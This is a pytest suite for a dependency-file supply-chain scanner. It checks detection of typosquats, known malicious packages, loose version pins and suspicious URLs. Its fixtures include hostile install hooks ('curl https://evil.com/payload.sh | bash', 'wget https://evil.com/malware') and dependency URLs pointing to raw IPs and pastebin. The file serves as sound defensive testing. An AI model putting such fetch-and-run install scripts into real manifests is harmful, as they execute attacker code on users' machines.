"""Tests for dependency file supply chain scanner."""

import pytest

from sentinel.scanners.dependency_scanner import DependencyScanner
from sentinel.core import RiskLevel


@pytest.fixture
def scanner():
    return DependencyScanner()


class TestRequirementsTxt:
    def test_clean_requirements(self, scanner):
        content = "requests==2.31.0\nflask==3.0.0\nnumpy>=1.24,<2.0\n"
        findings = scanner.scan(content, "requirements.txt")
        critical = [f for f in findings if f.risk >= RiskLevel.HIGH]
        assert len(critical) == 0

    def test_detects_typosquat(self, scanner):
        content = "reqests==2.31.0\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "typosquat" for f in findings)
        assert any("reqests" in f.description and "requests" in f.description for f in findings)

    def test_detects_known_malicious(self, scanner):
        content = "colourama==0.1.0\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "malicious_package" for f in findings)
        assert any(f.risk == RiskLevel.CRITICAL for f in findings)

    def test_detects_unpinned(self, scanner):
        content = "requests\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "unpinned_dependency" for f in findings)

    def test_detects_loose_version(self, scanner):
        content = "requests>=2.0\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "loose_version" for f in findings)

    def test_allows_bounded_version(self, scanner):
        content = "requests>=2.0,<3.0\n"
        findings = scanner.scan(content, "requirements.txt")
        loose = [f for f in findings if f.category == "loose_version"]
        assert len(loose) == 0

    def test_detects_suspicious_url(self, scanner):
        content = "git+https://evil-repo.xyz/malware.git\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "suspicious_url" for f in findings)

    def test_detects_ip_address_url(self, scanner):
        content = "https://192.168.1.100/packages/evil-1.0.tar.gz\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "suspicious_url" for f in findings)

    def test_detects_paste_site_url(self, scanner):
        content = "https://pastebin.com/raw/abc123\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "suspicious_url" for f in findings)
        assert any(f.risk == RiskLevel.CRITICAL for f in findings)

    def test_ignores_comments(self, scanner):
        content = "# This is a comment\nrequests==2.31.0\n"
        findings = scanner.scan(content, "requirements.txt")
        critical = [f for f in findings if f.risk >= RiskLevel.HIGH]
        assert len(critical) == 0

    def test_ignores_empty_lines(self, scanner):
        content = "\n\n\nrequests==2.31.0\n\n"
        findings = scanner.scan(content, "requirements.txt")
        critical = [f for f in findings if f.risk >= RiskLevel.HIGH]
        assert len(critical) == 0

    def test_allows_github_git_url(self, scanner):
        content = "git+https://github.com/psf/requests.git@v2.31.0\n"
        findings = scanner.scan(content, "requirements.txt")
        suspicious = [f for f in findings if f.category == "suspicious_url"]
        assert len(suspicious) == 0

    def test_multiple_typosquats(self, scanner):
        content = "reqests==1.0\nnumpi==1.0\nlodassh==1.0\n"
        findings = scanner.scan(content, "requirements.txt")
        typosquats = [f for f in findings if f.category == "typosquat"]
        assert len(typosquats) == 3


class TestPackageJson:
    def test_clean_package_json(self, scanner):
        content = '{"dependencies": {"express": "^4.18.0", "lodash": "~4.17.21"}}'
        findings = scanner.scan(content, "package.json")
        critical = [f for f in findings if f.risk >= RiskLevel.HIGH]
        assert len(critical) == 0

    def test_detects_malicious_package(self, scanner):
        content = '{"dependencies": {"crossenv": "^1.0.0"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "malicious_package" for f in findings)

    def test_detects_typosquat_js(self, scanner):
        content = '{"dependencies": {"loadash": "^4.0.0"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "typosquat" for f in findings)

    def test_detects_wildcard_version(self, scanner):
        content = '{"dependencies": {"express": "*"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "unpinned_dependency" for f in findings)

    def test_detects_latest_version(self, scanner):
        content = '{"dependencies": {"express": "latest"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "unpinned_dependency" for f in findings)

    def test_detects_dangerous_install_script(self, scanner):
        content = '{"scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "dangerous_install_script" for f in findings)
        assert any(f.risk == RiskLevel.CRITICAL for f in findings)

    def test_detects_install_script_with_wget(self, scanner):
        content = '{"scripts": {"preinstall": "wget https://evil.com/malware"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "dangerous_install_script" for f in findings)

    def test_detects_url_dependency(self, scanner):
        content = '{"dependencies": {"evil": "https://192.168.1.1/evil.tgz"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "suspicious_url" for f in findings)

    def test_scans_dev_dependencies(self, scanner):
        content = '{"devDependencies": {"crossenv": "^1.0.0"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "malicious_package" for f in findings)

    def test_invalid_json(self, scanner):
        content = "not json at all"
        findings = scanner.scan(content, "package.json")
        # Should not crash, just return empty
        assert isinstance(findings, list)

    def test_scans_peer_dependencies(self, scanner):
        content = '{"peerDependencies": {"crossenv": "^1.0.0"}}'
        findings = scanner.scan(content, "package.json")
        assert any(f.category == "malicious_package" for f in findings)


class TestPyprojectToml:
    def test_detects_malicious_in_pyproject(self, scanner):
        content = '[project]\ndependencies = [\n"colourama>=0.1"\n]\n'
        findings = scanner.scan(content, "pyproject.toml")
        assert any(f.category == "malicious_package" for f in findings)

    def test_detects_suspicious_url_in_pyproject(self, scanner):
        content = 'url = "https://192.168.1.100/packages/evil.tar.gz"\n'
        findings = scanner.scan(content, "pyproject.toml")
        assert any(f.category == "suspicious_url" for f in findings)


class TestAutoDetection:
    def test_scans_without_filename(self, scanner):
        """When no filename is given, try all parsers."""
        content = "reqests==1.0\n"
        findings = scanner.scan(content)
        assert any(f.category == "typosquat" for f in findings)

    def test_deduplicates_findings(self, scanner):
        """Findings should be deduplicated across parsers."""
        content = "reqests==1.0\n"
        findings = scanner.scan(content)
        typosquats = [f for f in findings if f.category == "typosquat"]
        # Should only appear once even if multiple parsers find it
        assert len(typosquats) == 1


class TestLineNumbers:
    def test_reports_correct_line(self, scanner):
        content = "flask==3.0.0\nrequests==2.31.0\nreqests==1.0\n"
        findings = scanner.scan(content, "requirements.txt")
        typosquat = [f for f in findings if f.category == "typosquat"][0]
        assert typosquat.metadata["line"] == 3

    def test_reports_package_name(self, scanner):
        content = "colourama==0.1\n"
        findings = scanner.scan(content, "requirements.txt")
        malicious = [f for f in findings if f.category == "malicious_package"][0]
        assert malicious.metadata["package"] == "colourama"


class TestScannerMetadata:
    def test_scanner_name(self, scanner):
        assert scanner.name == "dependency_scanner"

    def test_finding_scanner_field(self, scanner):
        content = "colourama==0.1\n"
        findings = scanner.scan(content, "requirements.txt")
        assert all(f.scanner == "dependency_scanner" for f in findings)


class TestEdgeCases:
    def test_empty_content(self, scanner):
        findings = scanner.scan("", "requirements.txt")
        assert len(findings) == 0

    def test_empty_package_json(self, scanner):
        findings = scanner.scan("{}", "package.json")
        assert len(findings) == 0

    def test_suspicious_tld(self, scanner):
        content = "git+https://evil-package.tk/repo.git\n"
        findings = scanner.scan(content, "requirements.txt")
        assert any(f.category == "suspicious_url" for f in findings)

    def test_multiple_python_typosquats(self, scanner):
        content = "djnago==3.0\nparmiko==2.0\n"
        findings = scanner.scan(content, "requirements.txt")
        typosquats = [f for f in findings if f.category == "typosquat"]
        assert len(typosquats) == 2
        packages = {f.metadata["package"] for f in typosquats}
        assert "djnago" in packages
        assert "parmiko" in packages
